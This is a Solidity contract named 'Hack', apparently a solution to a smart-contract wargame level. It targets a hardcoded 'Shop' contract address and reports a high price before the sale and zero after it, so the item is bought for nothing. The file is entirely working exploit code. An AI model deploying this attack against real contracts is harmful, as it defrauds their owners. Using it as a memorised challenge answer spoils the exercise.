// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
import"./Shop.sol";
contract Hack {
    uint fakePrice=101;
    uint reasnbleprice=0;
    address public victim=0xc4204abaE9dD5707Dcb8Ab1b7478C406a130f179;
    Shop public shop;
    constructor(){
      shop=Shop(victim);
    }
     function price() external  view returns (uint){
      if(shop.isSold())
      {return reasnbleprice;}
      return fakePrice;
     }
     
     function attack()external{
        shop.buy();
     }
}
